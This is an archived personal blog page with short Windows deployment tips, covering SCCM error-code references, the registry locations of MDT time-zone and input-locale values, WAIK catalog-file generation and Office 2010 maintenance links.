![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

Just stumbled over this nice page on technet:

[http://technet.microsoft.com/en-us/library/bb632794.aspx](https://web.archive.org/web/20120625102124/http%3A//technet.microsoft.com/en-us/library/bb632794.aspx)

It shows a list of error messages from System Center Configuration Manager and what they mean. Great list!

Rating 3.00 out of 5

**Posted in** [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment"), [SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/sccm/ "View all posts in SCCM")

# [TimeZoneName, InputLocale and Language Tag](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/timezonename-inputlocale-and-language-tag/ "Permanent Link to TimeZoneName, InputLocale and Language Tag")

[Mar11
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/timezonename-inputlocale-and-language-tag/)
[[Leave a Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/timezonename-inputlocale-and-language-tag/#respond "Comment on TimeZoneName, InputLocale and Language Tag")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/timezonename-inputlocale-and-language-tag/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

If you have ever tried to find a good documentation to what the TimeZoneNames should be when you are trying to deploy to different time zones, you can just have a look in the registry on a Windows 7 computer under the following key:

HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zones

Here you will find the complete list with the correct TimeZoneNames that you need for MDT.

And the Inputlocale you can find under this following registry path:

HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layouts

If you also need the language tag ID you can find a list here:

[http://technet.microsoft.com/en-us/library/cc179219.aspx](https://web.archive.org/web/20120625102124/http%3A//technet.microsoft.com/en-us/library/cc179219.aspx)

And as a bonus here is a link to where you can find default values for language packs:

[http://technet.microsoft.com/en-us/library/cc766191(v=ws.10).aspx](https://web.archive.org/web/20120625102124/http%3A//technet.microsoft.com/en-us/library/cc766191%28v%3Dws.10%29.aspx)

Rating 3.50 out of 5

Thank you for voting!

**Posted in** [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment")

# [Having trouble generating catalog file for Windows 7 X86](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/having-trouble-generating-catalog-file-for-windows-7-x86/ "Permanent Link to Having trouble generating catalog file for Windows 7 X86")

[Mar08
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/having-trouble-generating-catalog-file-for-windows-7-x86/)
[[Leave a Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/having-trouble-generating-catalog-file-for-windows-7-x86/#respond "Comment on Having trouble generating catalog file for Windows 7 X86")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/having-trouble-generating-catalog-file-for-windows-7-x86/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

I am guessing you are trying to edit unattend.xml file in WAIK. And in order to do that you have to generate a catalog file. In order to generate a catalog file to an X86 WIM/OS you have to do it on a computer/server with X86 OS with WAIK installed. After you have generated the catalog file you can copy it to your X64 server and do the editing from there.

Rating 3.00 out of 5

**Posted in** [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment"), [SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/sccm/ "View all posts in SCCM"), [Tools](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/tools/ "View all posts in Tools")

# [Best Practices for maintaining office 2010](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/02/best-practices-for-maintaining-office-2010/ "Permanent Link to Best Practices for maintaining office 2010")

[Feb24
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/02/best-practices-for-maintaining-office-2010/)
[[Leave a Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/02/best-practices-for-maintaining-office-2010/#respond "Comment on Best Practices for maintaining office 2010")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/02/best-practices-for-maintaining-office-2010/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

Microsoft has release a best practice document in regards of maintaining Office 2010 installations. Great reading

[http://technet.microsoft.com/en-us/library/cc982159.aspx](https://web.archive.org/web/20120625102124/http%3A//technet.microsoft.com/en-us/library/cc982159.aspx)

Rating 3.00 out of 5

**Posted in** [Client](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/client/ "View all posts in Client"), [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment"), [Office](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/office/ "View all posts in Office")

[« Older Entries](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/page/2/)

### Translate my page

Translate to:
ArabicBulgarianCatalanChinese (Simplified)Chinese (Traditional)CroatianCzechDanishDutchEnglishFilipinoFinnishFrenchGermanGreekHebrewHindiIndonesianItalianJapaneseKoreanLatvianLithuanianNorwegianPolishPortugueseRomanianRussianSerbianSlovakSlovenianSpanishSwedishUkrainianVietnamese
Powered by [Google Translate](https://web.archive.org/web/20120625102124/http%3A//translate.google.com/).[translation services](https://web.archive.org/web/20120625102124/http%3A//www.asiatranslate.net/translation-services.html)
### Tags

[Active Directory](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/active-directory/ "11 topics")
[Adsiedit](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/adsiedit/ "3 topics")
[Advertisment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/advertisment/ "1 topic")
[Blog](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/blog/ "2 topics")
[Client](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/client/ "2 topics")
[Collections](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/collections/ "2 topics")
[Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/deployment/ "11 topics")
[diskpart](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/diskpart/ "1 topic")
[DNS](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/dns/ "1 topic")
[error codes](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/error-codes/ "1 topic")
[Event](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/event/ "1 topic")
[Exchange](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/exchange/ "5 topics")
[ftp](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/ftp/ "1 topic")
[GPO](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/gpo/ "8 topics")
[Hotfix](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/hotfix/ "1 topic")
[IIS](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/iis/ "2 topics")
[mRemote](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/mremote/ "2 topics")
[Office 2007](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/office-2007/ "2 topics")
[Office 2010](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/office-2010/ "4 topics")
[Outlook](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/outlook/ "2 topics")
[Permissions](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/permissions/ "1 topic")
[powershell](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/powershell/ "1 topic")
[Registry](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/registry/ "1 topic")
[right click](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/right-click/ "2 topics")
[SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/sccm/ "12 topics")
[Scripts](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/scripts/ "2 topics")
[Search](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/search/ "2 topics")
[Security](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/security/ "1 topic")
[Server 2008 R2](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/server-2008-r2/ "1 topic")
[Spam](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/spam/ "1 topic")
[TechEd 2009](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/teched-2009/ "1 topic")
[Thin Pc](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/thin-pc/ "1 topic")
[time](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/time/ "2 topics")
[Tools](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/tools/ "4 topics")
[webdav](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/webdav/ "1 topic")
[Webmail](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/webmail/ "1 topic")
[Webservice](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/webservice/ "1 topic")
[Windows](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/windows/ "6 topics")
[WinPE](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/winpe/ "2 topics")
[WMI](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/wmi/ "1 topic")
### Popular Posts

* [Pictures in Active Directory Users and Computers](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2009/03/pictures-in-active-directory-users-and-computers/) (26593)
* [Using Pictures from Active Directory](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/02/using-pictures-from-active-directory/) (16175)
* [Deploy Office 2010 with integrated Language Packs](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2010/08/deploy-office-2010-with-integrated-language-packs/) (3940)
* [Configure PDC / Domain controller as an authoritative time server](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2009/03/configure-pdc-domain-controller-as-an-authoritative-time-server-2/) (3408)
* [Exchange 2010 will support Thumbnailphoto attribute! This means Pictures in Exchange GAL](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2009/12/exchange-2010-will-support-thumbnailphoto-attribute/) (2372)
* [Initiate restart of computer from active directory users and computers with right click](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2009/10/initiate-restart-of-computer-from-active-directory-users-and-computers-with-right-click/) (2023)
* [Looking up passwords in Mremote](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2010/03/looking-up-passwords-in-mremote/) (1639)
* [Problems starting WDS after PXE point is enabled in SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2010/09/problems-starting-wds-after-pxe-point-is-enabled-in-sccm/) (1493)
* [Apply .WIM with SCCM: Windows cannot verify the digital signature for this file](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2010/08/apply-wim-with-sccm-windows-cannot-verify-the-digital-signature-for-this-file/) (1220)
* [Group Policy Preferences F5 F6 F7 F8 “documentation”](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2010/11/group-policy-preferences-f5-f6-f7-f8-documentation/) (829)
### Group Policy

* [-=MVP=- Florian's Blog](https://web.archive.org/web/20120625102124/http%3A//www.frickelsoft.net/blog/ "MVP on GPO")
* [-=MVP=- GP Answers](https://web.archive.org/web/20120625102124/http%3A//gpanswers.com/)
* [-=MVP=- GPO Guy Blog](https://web.archive.org/web/20120625102124/http%3A//sdmsoftware.com/blog/ "MVP on GPO")
* [-=MVP=- http://www.grouppolicy.biz/](https://web.archive.org/web/20120625102124/http%3A//www.grouppolicy.biz/ "http://www.grouppolicy.biz/")
* [Group Policy Team Blog](https://web.archive.org/web/20120625102124/http%3A//blogs.technet.com/b/grouppolicy/)
* [Group Policy Videos on Technet Edge](https://web.archive.org/web/20120625102124/http%3A//technet.microsoft.com/nb-no/edge/ff832960.aspx?query=1&Category=group+policy)

### Other blogs

* [Åsmund’s Blog](https://web.archive.org/web/20120625102124/http%3A//myklevoll.blogspot.com/)
* [Marius Kildedal's Blog](https://web.archive.org/web/20120625102124/http%3A//www.kildedal.no/ "Cisco related")
* [Morgan Simonsen's blog](https://web.archive.org/web/20120625102124/http%3A//morgansimonsen.wordpress.com/)
* [Olav Tvedt's Blog](https://web.archive.org/web/20120625102124/http%3A//www.tvedt.info/blog/blog.php "MVP deployment ranger")
* [Roger Knutsens Blog](https://web.archive.org/web/20120625102124/http%3A//ktnx.wordpress.com/)
* [Sem Meijer's Blog](https://web.archive.org/web/20120625102124/http%3A//cheeseking.net/ "Up and coming blog")
* [Tom-Inge Larsen’s Blog](https://web.archive.org/web/20120625102124/http%3A//unifiedcom.blogspot.com/)

### SCCM/MDT/USMT/WAIK

* [CCMEXEC.COM](https://web.archive.org/web/20120625102124/http%3A//ccmexec.com/)
* [Codeplex MDT Projects](https://web.archive.org/web/20120625102124/http%3A//www.codeplex.com/site/search?projectSearchText=mdt)
* [ConfigMgrFu](https://web.archive.org/web/20120625102124/http%3A//myitforum.com/cs2/blogs/jsandys/default.aspx)
* [deploywindows.net](https://web.archive.org/web/20120625102124/http%3A//deploywindows.net/)
* [Frode Henriksen's blog](https://web.archive.org/web/20120625102124/http%3A//frode.org/)
* [Johan Arwidmark's Blog – Deployment GURU!](https://web.archive.org/web/20120625102124/http%3A//deploymentresearch.com/ "Great blog with tons of info and videos!")
* [Michael Niehaus blog](https://web.archive.org/web/20120625102124/http%3A//blogs.technet.com/b/mniehaus/ "Head Developer of MDT")
* [Xtremeconsulting.com](https://web.archive.org/web/20120625102124/http%3A//deployment.xtremeconsulting.com/)

### Stats

Visits today: 27

Visitors Online: 2
### Spam Blocked

 [12,397 spam comments blocked by](https://web.archive.org/web/20120625102124/http%3A//akismet.com/)

[EvoLve](https://web.archive.org/web/20120625102124/http%3A//theme4press.com/evolve/) theme by Theme4Press  •  Powered by [WordPress](https://web.archive.org/web/20120625102124/http%3A//wordpress.org/) [Oddvar Haaland Moe's Blog](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/)
My notes


